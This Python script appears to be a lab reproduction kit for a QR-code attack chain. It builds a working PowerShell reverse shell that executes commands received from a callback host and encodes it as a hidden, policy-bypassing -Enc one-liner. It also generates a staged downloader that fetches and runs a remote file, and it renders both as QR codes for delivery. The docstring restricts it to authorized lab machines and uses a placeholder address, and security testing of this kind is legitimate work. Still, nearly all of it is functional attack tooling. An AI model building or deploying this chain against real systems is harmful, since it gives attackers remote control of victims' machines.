#!/usr/bin/env python3
"""build_poc.py -- W0.1 baseline reproduction kit for the QR-Code-Compromise
README chain, rebuilt as reproducible software instead of manual steps.

Chain reproduced (README "Staging" + "Attack" phases):
  1. reverse-shell PowerShell payload -> one-lined
  2. UTF-16LE base64 encoding -> `powershell -NoP -NonI -W Hidden -Exec
     Bypass -Enc <b64>` one-liner (README steps 1-2; this is hosted as 1.txt)
  3. staged downloader one-liner that fetches 1.txt over HTTP (steps 4-5)
  4. QR codes (PNG + PDF) of both one-liners via segno (step 6)

Outputs land in lab/baseline/out/ (gitignored) so no generated attack
artifact is ever committed.

AUTHORIZATION — LAB ONLY. The embedded payload connects to a PLACEHOLDER
address (10.99.12.233) that is DOCUMENTED AS AN EXAMPLE ONLY; it exists so
the reproduction is self-contained. Point --host at a lab address you own
and have written authorization to test. This script is for building the
baseline demonstration on owned lab VMs (GX.1/GX.2 in COORDINATION.md).
"""

import argparse
import base64
import pathlib
import sys

try:
    import segno
except ImportError:
    sys.exit("error: segno is required (the single approved dependency): "
             "pip install segno")

# README step 1/2 reverse shell, one-lined, placeholder address (EXAMPLE ONLY).
REV_SHELL_TEMPLATE = (
    "$client = New-Object System.Net.Sockets.TCPClient(\"{HOST}\",{PORT});"
    "$stream = $client.GetStream();"
    "[byte[]]$bytes = 0..65535|%{{0}};"
    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
    "{{;$data = (New-Object -TypeName System.Text.ASCIIEncoding)"
    ".GetString($bytes,0, $i);"
    "$sendback = (iex $data 2>&1 | Out-String );"
    "$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";"
    "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
    "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
    "$client.Close()"
)

ENC_PREFIX = "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc "

# README step 5 downloader (staged variant), faithful to the original
# write-up including its quoting quirks; placeholder address EXAMPLE ONLY.
DOWNLOADER_TEMPLATE = (
    "powershell -W Hidden -c \"& {{$2=$env:temp;"
    "iex(New-object System.net.Webclient)"
    ".DownloadFile('http://{HOST}:{HTTP_PORT}/1.txt',$2+'\\1.ps1'); "
    ".$2'\\1.ps1'}}\" "
)


def build_enc_one_liner(ps_text):
    """PowerShell -EncodedCommand form: UTF-16LE bytes -> base64.

    Matches `[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($t))`
    (Unicode == UTF-16LE in .NET).
    """
    b64 = base64.b64encode(ps_text.encode("utf-16-le")).decode("ascii")
    return ENC_PREFIX + b64


def build_downloader(host, http_port):
    return DOWNLOADER_TEMPLATE.format(HOST=host, HTTP_PORT=http_port)


def write_qr(content, name, out_dir, note):
    """Generate PNG + PDF QRs for `content`, trying EC M then L for capacity."""
    qr = None
    for ec in ("m", "l"):
        try:
            qr = segno.make(content, error=ec)
            break
        except segno.DataOverflowError:
            continue
    if qr is None:
        raise segno.DataOverflowError(
            "content too long for a single QR code (%d chars)" % len(content))
    stem = out_dir / name
    png, pdf = stem.with_suffix(".png"), stem.with_suffix(".pdf")
    qr.save(str(png), scale=4, border=4)
    qr.save(str(pdf))
    print("  %-16s PNG %6d bytes  PDF %6d bytes  "
          "ver=%s ec=%s modules=%d (%s)"
          % (name + ".png", png.stat().st_size, pdf.stat().st_size,
             qr.version, qr.error, qr.symbol_size()[0], note))
    return png, pdf


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--host", default="10.99.12.233",
                    help="reverse-shell callback host (EXAMPLE-ONLY "
                         "placeholder; default 10.99.12.233)")
    ap.add_argument("--port", type=int, default=7775,
                    help="reverse-shell TCP port (default 7775)")
    ap.add_argument("--http-port", type=int, default=7776,
                    help="staging HTTP port (default 7776)")
    ap.add_argument("--out-dir", default=None,
                    help="output directory (default: <script dir>/out)")
    args = ap.parse_args()

    out_dir = pathlib.Path(args.out_dir) if args.out_dir else \
        pathlib.Path(__file__).resolve().parent / "out"
    out_dir.mkdir(parents=True, exist_ok=True)

    print("W0.1 baseline reproduction kit")
    print("  host=%s:%d http=%d  (host is an EXAMPLE-ONLY lab placeholder)"
          % (args.host, args.port, args.http_port))

    rev_shell = REV_SHELL_TEMPLATE.format(HOST=args.host, PORT=args.port)
    enc_one_liner = build_enc_one_liner(rev_shell)
    downloader = build_downloader(args.host, args.http_port)

    outputs = [
        ("payload.ps1",
         "# EXAMPLE-ONLY lab reproduction (QR-Code-Compromise W0.1).\n"
         "# Placeholder address %s -- do not point at real infrastructure.\n\n"
         % args.host + rev_shell + "\n"),
        ("1.txt", enc_one_liner + "\n"),          # staged file, hosted via HTTP
        ("one-liner-enc.txt", enc_one_liner + "\n"),
        ("one-liner-downloader.txt", downloader + "\n"),
    ]
    for name, content in outputs:
        p = out_dir / name
        p.write_text(content, encoding="utf-8")
        print("  %-24s %6d bytes" % (name, p.stat().st_size))

    print("QR codes (segno):")
    write_qr(enc_one_liner, "qr-inline", out_dir,
             "inline: whole -Enc one-liner as QR")
    write_qr(downloader, "qr-staged", out_dir,
             "staged: downloader one-liner (faithful README chain)")

    print("done: %s (%d files)" % (out_dir, len(list(out_dir.iterdir()))))
    print("lab-only: host the files, scan/execute ONLY on authorized lab VMs")
    return 0


if __name__ == "__main__":
    sys.exit(main())
